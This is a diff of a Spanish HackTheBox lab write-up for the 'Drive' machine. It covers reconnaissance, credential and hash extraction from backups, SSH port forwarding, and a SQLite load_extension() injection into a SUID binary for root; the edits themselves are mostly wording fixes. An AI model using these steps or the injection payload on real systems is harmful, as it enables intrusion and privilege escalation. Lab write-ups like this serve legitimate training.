@@ -5,41 +5,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Writeup Drive</title>
  <link rel="stylesheet" href="/assets/css/styles_machine.css" />
+ <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
+ <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">    
 </head>
 <body>
-  <div class="menu">
-    <div id="mySidepanel" class="sidepanel">
-        <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">×</a>
-        <a href="/htb">HackTheBox</a>
-        <a href="/">Home</a>
-        <a href="https://mrpr1ngl3s.github.io/blog">Blog</a>
-    </div>
-    
-    <button class="openbtn" onclick="openNav()">☰</button>  
-</div>
-<script>
-function openNav() {
-if (window.innerWidth <= 1000) {
-    document.getElementById("mySidepanel").style.display = "block";
-} else {
-    document.getElementById("mySidepanel").style.width = "25%";
-}
-}
-
-function closeNav() {
-if (window.innerWidth <= 1000) {
-    document.getElementById("mySidepanel").style.display = "none";
-} else {
-    document.getElementById("mySidepanel").style.width = "0";
-}
-
-}
-
-</script>
-
   <div class="main">
 <a href="https://app.hackthebox.com/machines/Drive/"  target="_blank"><img style="float: right; margin-left:60px; height:90px;" src="/img/Drive.png"/></a>
 <h1 id="drive">Drive</h1>
@@ -119,26 +91,24 @@ if (window.innerWidth <= 1000) {
 </tr>
 </tbody>
 </table>
-<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a></span>
-<span id="cb3-2"><a href="#cb3-2" aria-hidden="true"></a>❯ <span class="fu">nmap</span> -p- --open -sCV -n --min-rate 5000 -Pn 10.10.11.235 -oN Scan</span>
-<span id="cb3-3"><a href="#cb3-3" aria-hidden="true"></a><span class="ex">Starting</span> Nmap 7.93 ( https://nmap.org ) <span class="ex">at</span> 2024-02-29 12:24 CET</span>
-<span id="cb3-4"><a href="#cb3-4" aria-hidden="true"></a><span class="ex">Nmap</span> scan report for 10.10.11.235</span>
-<span id="cb3-5"><a href="#cb3-5" aria-hidden="true"></a><span class="ex">Host</span> is up (0.098s latency)<span class="ex">.</span></span>
-<span id="cb3-6"><a href="#cb3-6" aria-hidden="true"></a><span class="ex">Not</span> shown: 65532 closed tcp ports (reset), <span class="ex">1</span> filtered tcp port (no-response)</span>
-<span id="cb3-7"><a href="#cb3-7" aria-hidden="true"></a><span class="ex">Some</span> closed ports may be reported as filtered due to --defeat-rst-ratelimit</span>
-<span id="cb3-8"><a href="#cb3-8" aria-hidden="true"></a><span class="ex">PORT</span>   STATE SERVICE VERSION</span>
-<span id="cb3-9"><a href="#cb3-9" aria-hidden="true"></a><span class="ex">22/tcp</span> open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux<span class="kw">;</span> <span class="ex">protocol</span> 2.0)</span>
-<span id="cb3-10"><a href="#cb3-10" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">ssh-hostkey</span>: </span>
-<span id="cb3-11"><a href="#cb3-11" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">3072</span> 275a9fdb91c316e57da60d6dcb6bbd4a (RSA)</span>
-<span id="cb3-12"><a href="#cb3-12" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">256</span> 9d076bc847280df29f81f2b8c3a67853 (ECDSA)</span>
-<span id="cb3-13"><a href="#cb3-13" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_</span>  256 1d30349f797369bdf667f3343c1ff94e (ED25519)</span>
-<span id="cb3-14"><a href="#cb3-14" aria-hidden="true"></a><span class="ex">80/tcp</span> open  http    nginx 1.18.0 (Ubuntu)</span>
-<span id="cb3-15"><a href="#cb3-15" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-title</span>: Did not follow redirect to http://drive.htb/</span>
-<span id="cb3-16"><a href="#cb3-16" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-server-header</span>: nginx/1.18.0 (Ubuntu)</span>
-<span id="cb3-17"><a href="#cb3-17" aria-hidden="true"></a><span class="ex">Service</span> Info: OS: Linux<span class="kw">;</span> <span class="ex">CPE</span>: cpe:/o:linux:linux_kernel</span>
-<span id="cb3-18"><a href="#cb3-18" aria-hidden="true"></a></span>
-<span id="cb3-19"><a href="#cb3-19" aria-hidden="true"></a><span class="ex">Service</span> detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
-<span id="cb3-20"><a href="#cb3-20" aria-hidden="true"></a><span class="ex">Nmap</span> done: 1 IP address (1 host up) <span class="ex">scanned</span> in 26.20 seconds</span></code></pre></div>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="ex">Starting</span> Nmap 7.93 ( https://nmap.org ) <span class="ex">at</span> 2024-02-29 12:24 CET</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true"></a><span class="ex">Nmap</span> scan report for 10.10.11.235</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true"></a><span class="ex">Host</span> is up (0.098s latency)<span class="ex">.</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true"></a><span class="ex">Not</span> shown: 65532 closed tcp ports (reset), <span class="ex">1</span> filtered tcp port (no-response)</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true"></a><span class="ex">Some</span> closed ports may be reported as filtered due to --defeat-rst-ratelimit</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true"></a><span class="ex">PORT</span>   STATE SERVICE VERSION</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true"></a><span class="ex">22/tcp</span> open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux<span class="kw">;</span> <span class="ex">protocol</span> 2.0)</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">ssh-hostkey</span>: </span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">3072</span> 275a9fdb91c316e57da60d6dcb6bbd4a (RSA)</span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">256</span> 9d076bc847280df29f81f2b8c3a67853 (ECDSA)</span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_</span>  256 1d30349f797369bdf667f3343c1ff94e (ED25519)</span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true"></a><span class="ex">80/tcp</span> open  http    nginx 1.18.0 (Ubuntu)</span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-title</span>: Did not follow redirect to http://drive.htb/</span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-server-header</span>: nginx/1.18.0 (Ubuntu)</span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true"></a><span class="ex">Service</span> Info: OS: Linux<span class="kw">;</span> <span class="ex">CPE</span>: cpe:/o:linux:linux_kernel</span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true"></a></span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true"></a><span class="ex">Service</span> detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true"></a><span class="ex">Nmap</span> done: 1 IP address (1 host up) <span class="ex">scanned</span> in 26.20 seconds</span></code></pre></div>
 <p>Los puertos que se han descubierto son.</p>
 <table>
 <thead>
@@ -175,7 +145,7 @@ if (window.innerWidth <= 1000) {
 <img src="Img/Pasted image 20240229135434 1.png">
 <p>Al cambiar el numero ahora nos muestra otro archivo pero en este caso no tenemos acceso a este.</p>
 <img src="Img/Pasted image 20240229135627 1.png">
-<p>Habrán mas archivos a parte de esos 2 por lo que para no estar poniendo manualmente los ID vamos a crear un script el cual lo automatice.</p>
+<p>Habrán mas archivos a parte de esos 2 por lo que para no estar poniendo manualmente los IDs vamos a crear un script el cual lo automatice.</p>
 <p>Si tratamos de ver la petición con <strong>curl</strong> nos salta un panel de login.</p>
 <div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a>❯ <span class="ex">curl</span> -s -X GET <span class="st">&quot;http://drive.htb/100/getFileDetail/&quot;</span> -L</span></code></pre></div>
 <table>
@@ -234,7 +204,7 @@ if (window.innerWidth <= 1000) {
 <span id="cb5-28"><a href="#cb5-28" aria-hidden="true"></a> <span class="op">&lt;</span>/<span class="ex">div</span><span class="op">&gt;</span></span>
 <span id="cb5-29"><a href="#cb5-29" aria-hidden="true"></a><span class="op">&lt;</span>/<span class="ex">body</span><span class="op">&gt;</span></span>
 <span id="cb5-30"><a href="#cb5-30" aria-hidden="true"></a><span class="op">&lt;</span>/<span class="ex">html</span><span class="op">&gt;</span></span></code></pre></div>
-<p>Al interceptar la petición del login con BurpSuite vemos que arrastra un <strong>csrftoken</strong>.</p>
+<p>Al interceptar la petición del login con <strong>BurpSuite</strong> vemos que arrastra un <strong>csrftoken</strong>.</p>
 <img src="Img/Pasted image 20240229171252 1.png">
 <p>Realizando una petición al login con <strong>curl</strong> vemos que el <strong>csrftoken</strong> va cambiando con cada solicitud.</p>
 <div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a>❯ <span class="kw">for</span> <span class="ex">x</span> in <span class="va">$(</span><span class="fu">seq</span> 1 10<span class="va">)</span><span class="kw">;</span> <span class="kw">do</span> <span class="ex">curl</span> -s -X GET <span class="st">&quot;http://drive.htb/login&quot;</span> -L <span class="kw">|</span> <span class="fu">grep</span> <span class="st">&quot;csrfmiddlewaretoken&quot;</span> <span class="kw">|</span> <span class="fu">grep</span> -oP <span class="st">&#39;value=\K&quot;.*?&quot;&#39;</span><span class="kw">;</span> <span class="kw">done</span></span>
@@ -325,7 +295,7 @@ if (window.innerWidth <= 1000) {
 <p>Con la diferencia de que ahora al cambiar de ID nos permite ver el contenido del archivo.</p>
 <img src="Img/Pasted image 20240229200929 1.png">
 <p>Al entrar en uno de los ID descubiertos vemos que el archivo guardaba credenciales en texto plan.</p>
-<p>Viendo que esta el puerto 22 abierto conseguimos conectarnos con dichas credenciales.</p>
+<p>Estando el puerto 22 abierto, intentamos conectarnos con dichas credenciales.</p>
 <img src="Img/Pasted image 20240229201142 1.png">
 <p>Viendo los procesos que corren con el comando <strong>ps</strong> vemos que el usuario git esta corriendo <strong>gitea</strong>.</p>
 <div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true"></a><span class="ex">martin@drive</span>:~$ ps -aux</span></code></pre></div>
@@ -394,7 +364,7 @@ if (window.innerWidth <= 1000) {
 <img src="Img/Pasted image 20240301141440 1.png">
 <p>Si realizamos un <strong>curl</strong> a la dirección <strong>http://localhost:3000</strong> nos muestra el contenido de <strong>gitea</strong>.</p>
 <img src="Img/Pasted image 20240302103831 1.png">
-<p>Para acceder a la página, realizaremos con <strong>ssh</strong> un reenvío de puerto local (<strong>Local Port Forwarding</strong>), permitiendo que el puerto 3000 de la máquina <strong>Drive</strong> se enlace directamente con nuestro puerto 300.</p>
+<p>Para acceder a la página, realizaremos con <strong>ssh</strong> un reenvío de puerto local (<strong>Local Port Forwarding</strong>), permitiendo que el puerto 3000 de la máquina <strong>Drive</strong> se enlace directamente con nuestro puerto 3000.</p>
 <div class="sourceCode" id="cb13"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true"></a>❯ <span class="fu">ssh</span> martin@10.10.11.235 -L:3000:127.0.0.1:3000 -fN</span></code></pre></div>
 <table>
 <colgroup>
@@ -422,13 +392,13 @@ if (window.innerWidth <= 1000) {
 </tr>
 </tbody>
 </table>
-<p>Tras realizar el <strong>Local Port Forwarding</strong> al acceder a nuestro puerto 3000 vía <strong>HTTP</strong> vemos el contenido del <strong>gitea</strong>.</p>
+<p>Tras realizar el <strong>Local Port Forwarding</strong> y acceder a nuestro puerto 3000 vía <strong>HTTP</strong> vemos el contenido del <strong>gitea</strong>.</p>
 <img src="Img/Pasted image 20240302125649 1.png">
 <p>Viendo los usuarios, nos damos cuenta de que está el usuario <strong>martin</strong>.</p>
 <img src="Img/Pasted image 20240302130204 1.png">
 <p>En el panel de login, observamos que podemos reutilizar la contraseña que encontramos anteriormente para conectarnos como el usuario <strong>martinCruz</strong>.</p>
 <img src="Img/Pasted image 20240302132516 1.png">
-<p>Vemos que el usuario “CrisDisel” tiene un repositorio.</p>
+<p>Vemos que el usuario <strong>CrisDisel</strong> tiene un repositorio.</p>
 <img src="Img/Pasted image 20240302185359 1.png">
 <p>En el archivo <strong>db_backup.sh</strong> se esta creando de <strong>db.sqlite3</strong> un comprimido para posteriormente guardarlo en <strong>/var/www/backups/</strong> con una contraseña.</p>
 <img src="Img/Pasted image 20240302185034 1.png">
@@ -441,7 +411,7 @@ if (window.innerWidth <= 1000) {
 <span id="cb14-6"><a href="#cb14-6" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 www-data www-data   12722 Sep  1  2023 1_Oct_db_backup.sqlite3.7z</span>
 <span id="cb14-7"><a href="#cb14-7" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 www-data www-data   12770 Sep  1  2023 1_Sep_db_backup.sqlite3.7z</span>
 <span id="cb14-8"><a href="#cb14-8" aria-hidden="true"></a><span class="ex">-rwxr-xr-x</span> 1 root     root     3760128 Dec 26  2022 db.sqlite3</span></code></pre></div>
-<p>Añadimos todo el contenido a un archivo comprimido para enviármelo y operar de forma mas cómoda.</p>
+<p>Añadimos todo el contenido a un archivo comprimido para enviárnoslo y operar de forma mas cómoda.</p>
 <div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true"></a><span class="ex">martin@drive</span>:/tmp$ zip comprimido.zip /var/www/backups/* -j</span>
 <span id="cb15-2"><a href="#cb15-2" aria-hidden="true"></a>  <span class="ex">adding</span>: 01_Mar_db_backup.sqlite3.7z (stored 0%)</span>
 <span id="cb15-3"><a href="#cb15-3" aria-hidden="true"></a>  <span class="ex">adding</span>: 1_Dec_db_backup.sqlite3.7z (stored 0%)</span>
@@ -683,7 +653,7 @@ sqlite&gt; </code></pre>
 <span id="cb25-19"><a href="#cb25-19" aria-hidden="true"></a>├── <span class="ex">comprimido.zip</span></span>
 <span id="cb25-20"><a href="#cb25-20" aria-hidden="true"></a>├── <span class="ex">credentials.txt</span></span>
 <span id="cb25-21"><a href="#cb25-21" aria-hidden="true"></a>└── <span class="ex">hashes</span></span></code></pre></div>
-<p>para no estar realizando el mismo procedimiento para buscar los hashes con el parámetro <strong>–line</strong> de <strong>sqlite3</strong> podemos automatizar todo eso y pillar los hashes.</p>
+<p>para evitar estar realizando el mismo procedimiento para buscar hashes, con el parámetro <strong>–line</strong> de <strong>sqlite3</strong> podemos automatizar todo eso y pillar los hashes.</p>
 <div class="sourceCode" id="cb26"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true"></a>❯ <span class="fu">find</span> . -name <span class="st">&quot;db.sqlite3&quot;</span> <span class="kw">|</span> <span class="kw">while</span> <span class="bu">read</span> <span class="va">line</span>; <span class="kw">do</span> <span class="ex">sqlite3</span> <span class="va">$line</span> --line <span class="st">&#39;select * from accounts_customuser&#39;</span><span class="kw">;done</span> <span class="kw">|</span> <span class="fu">grep</span> password <span class="kw">|</span> <span class="fu">awk</span> <span class="st">&#39;NF{print $NF}&#39;</span> <span class="kw">|</span> <span class="fu">grep</span> -v <span class="st">&quot;pbkdf2&quot;</span></span>
 <span id="cb26-2"><a href="#cb26-2" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$W5IGzMqPgAUGMKXwKRmi08$0</span>30814d90a6a50ac29bb48e0954a89132302483a</span>
 <span id="cb26-3"><a href="#cb26-3" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$E9cadw34Gx4E59Qt18NLXR$6</span>0919b923803c52057c0cdd1d58f0409e7212e9f</span>
@@ -722,8 +692,8 @@ sqlite&gt; </code></pre>
 <span id="cb29-4"><a href="#cb29-4" aria-hidden="true"></a><span class="ex">tom@drive</span>:~$ cat user.txt </span>
 <span id="cb29-5"><a href="#cb29-5" aria-hidden="true"></a><span class="ex">6fa*****************************</span></span>
 <span id="cb29-6"><a href="#cb29-6" aria-hidden="true"></a><span class="ex">tom@drive</span>:~$ </span></code></pre></div>
-<p>En el directorio personal de trabajo del usuario tom vemos un binario con permisos <strong>SUID</strong>.</p>
 <h2>Post-explotación</h2>
+<p>En el directorio personal de trabajo del usuario tom vemos un binario con permisos <strong>SUID</strong>.</p>
 <div class="sourceCode" id="cb30"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true"></a><span class="ex">tom@drive</span>:~$ ls -l</span>
 <span id="cb30-2"><a href="#cb30-2" aria-hidden="true"></a><span class="ex">total</span> 880</span>
 <span id="cb30-3"><a href="#cb30-3" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 tom  tom      0 Mar  2 09:42 db.sqlite3</span>
@@ -762,7 +732,7 @@ sqlite&gt; </code></pre>
 <img src="Img/Pasted image 20240423100223.png">
 <img src="Img/Pasted image 20240423100514.png">
 <img src="Img/Pasted image 20240423101155.png">
-<p>Vemos la función main.</p>
+<p>Vemos la función <strong>main</strong>.</p>
 <img src="Img/Pasted image 20240303131155 1.png">
 <p>En caso de que se proporcionen las credenciales correctas se ejecutara la función <strong>main_menu()</strong>.</p>
 <img src="Img/Pasted image 20240303132308 1.png">
@@ -772,11 +742,11 @@ sqlite&gt; </code></pre>
 <img src="Img/Pasted image 20240304095456.png">
 <p>Y dentro de esa función pide un usuario, en caso de que el valor del usuario enviado no este vacío realiza una sanitización en la función <strong>sanitize_string()</strong> que recibe la variable del valor enviado <strong>local_148</strong>.</p>
 <img src="Img/Pasted image 20240304095912.png">
-<p>En la función <strong>sanitize_string()</strong> vemos que en el valor tan largo de la variable <strong>local_29</strong> al pasarlo en formato "char" muestra varios caracteres los cuales seguramente son los badchars <strong>\\{/| ’\n\0</strong>  .</p>
+<p>En la función <strong>sanitize_string()</strong> vemos que en el valor tan largo de la variable <strong>local_29</strong> al pasarlo en formato <strong>char</strong> muestra varios caracteres los cuales seguramente son los badchars <strong>\\{/| ’\n\0</strong>  .</p>
 <img src="Img/Pasted image 20240304104945.png">
 <img src="Img/Pasted image 20240304104349.png">
 <img src="Img/Pasted image 20240304104523.png">
-<p>En esta parte de código vemos que esta creando un bucle que finaliza hasta que valor de <strong>local_30</strong> sea igual a 9, en la comparativa vemos que si en la posición <strong>local_38</strong> que ahora es 0 (de la cadena que se recibe <strong>param_1</strong>), sea igual a <strong>local_29</strong> <strong>\\{/| ’\n\0</strong> entonces no lo cuenta.</p>
+<p>En esta parte de código vemos que está creando un bucle que finaliza hasta que valor de <strong>local_30</strong> sea igual a 9, en la comparativa vemos que si en la posición <strong>local_38</strong> que ahora es 0 (de la cadena que se recibe <strong>param_1</strong>), sea igual a <strong>local_29</strong> <strong>\\{/| ’\n\0</strong> entonces no lo cuenta.</p>
 <img src="Img/Pasted image 20240304111438.png">
 <p>En el binario, en la parte del nombre de usuario si añadimos esos caracteres no deseados, los borra de la cadena.</p>
 <img src="Img/Pasted image 20240304112930.png">
@@ -787,14 +757,14 @@ sqlite&gt; </code></pre>
 <img src="Img/Pasted image 20240304163934.png">
 <p>Aquí se detalla la funcionalidad de <a class="link" href="https://www.sqlite.org/c3ref/load_extension.html">load_extension()</a>.</p>
 <p>La idea es que a la hora de cargar una extensión se pueda crear un archivo de biblioteca compartida para cargar un comando a nivel de sistema.</p>
-<p>Cuando se crea un archivo de biblioteca compartida por defecto, SQLite intentará cargarlo para utilizarlo como función de entrada y ejecutar la instrucción u operación definida en esa extensión. SQLite buscará una función llamada “sqlite3_extension_init” en el archivo de biblioteca compartida. Sin embargo, si esta función no existe, SQLite buscará una función llamada “sqlite3_X_init”, donde “X” es el nombre del archivo quitando desde la primera barra <strong>/</strong> hasta el primer punto <strong>.</strong> y sin la palabra <strong>lib</strong>.</p>
-<p>Ej: Si creamos un archivo de biblioteca compartida con nombre “test.so” o “libtest”, quitara tanto la extensión <strong>.so</strong> como la palabra <strong>lib</strong>, quedando al final como <strong>test</strong>, para luego buscar y ejecutar la función con el nombre <strong>sqlite3_test_init</strong>.</p>
+<p>Cuando se crea un archivo de biblioteca compartida por defecto, SQLite intentará cargarlo para utilizarlo como función de entrada y ejecutar la instrucción u operación definida en esa extensión. SQLite buscará una función llamada <strong>sqlite3_extension_init</strong> en el archivo de biblioteca compartida. Sin embargo, si esta función no existe, SQLite buscará una función llamada “sqlite3_X_init”, donde “X” es el nombre del archivo quitando desde la primera barra <strong>/</strong> hasta el primer punto <strong>.</strong> y sin la palabra <strong>lib</strong>.</p>
+<p>Ej: Si creamos un archivo de biblioteca compartida con nombre <strong>test.so</strong> o <strong>libtest</strong>, quitara tanto la extensión <strong>.so</strong> como la palabra <strong>lib</strong>, quedando al final como <strong>test</strong>, para luego buscar y ejecutar la función con el nombre <strong>sqlite3_test_init</strong>.</p>
 <p>Si ponemos directamente el <strong>load_extension()</strong> no va a funciona ya que <strong>WHERE</strong> no espera ninguna otra operatoria.</p>
 <div class="sourceCode" id="cb34"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true"></a><span class="ex">/usr/bin/sqlite3</span> /var/www/DoodleGrive/db.sqlite3 -line <span class="st">&#39;UPDATE accounts_customuser SET is_active=1 WHERE username=&quot;&quot; load_extension()&quot;;</span></span></code></pre></div>
 <p>Lo que si que se puede hacer es jugar con concatenaciones <strong>+</strong>, en este caso añadimos <strong>ro</strong> y lo concatenamos con <strong>jo</strong> quedando como <strong>rojo</strong>, pero para que no quede ninguna comilla colgando añadimos otra concatenación con otra comilla.</p>
 <img src="Img/Pasted image 20240423113001.png">
 <img src="Img/Pasted image 20240423113056.png">
-<p>Por tanto realizamos una concatenación para que interprete el <strong>load_extension()</strong>, quedando de la siguiente forma <strong>"“+load_extension()+”";</strong>.</p>
+<p>Por tanto realizamos una concatenación para que interprete el <strong>load_extension()</strong>, quedando de la siguiente forma <strong>""+load_extension()+"";</strong>.</p>
 <div class="sourceCode" id="cb35"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true"></a><span class="ex">/usr/bin/sqlite3</span> /var/www/DoodleGrive/db.sqlite3 -line <span class="st">&#39;UPDATE accounts_customuser SET is_active=1 WHERE username=&quot;&quot;+load_extension()+&quot;&quot;;</span></span></code></pre></div>
 <p>Si lo ejecutamos en el binario queda tal que así.</p>
 <img src="Img/Pasted image 20240423113241.png">
@@ -867,7 +837,7 @@ sqlite&gt; </code></pre>
 </tbody>
 </table>
 <img src="Img/Pasted image 20240423130529.png">
-<p>Ahora al pasarlo al binario no pasa nada.</p>
+<p>Al pasarlo al binario no pasa nada.</p>
 <img src="Img/Pasted image 20240423131707.png">
 <p>Pero al mirar los permisos del binario <strong>bash</strong> podemos ver que tiene el permiso SUID.</p>
 <img src="Img/Pasted image 20240423131732.png"> Pudiendo finalmente acceder como el usuario <strong>root</strong> y visualizar la ultima flag.
@@ -881,6 +851,8 @@ sqlite&gt; </code></pre>
 
 <hr />
 <p>© <script>document.write(new Date().getFullYear());</script> - Mr. Pr1ngl3s</p>
+
+<script src="/assets/js/Nav.js" defer></script>
 
   </div>
 </body>
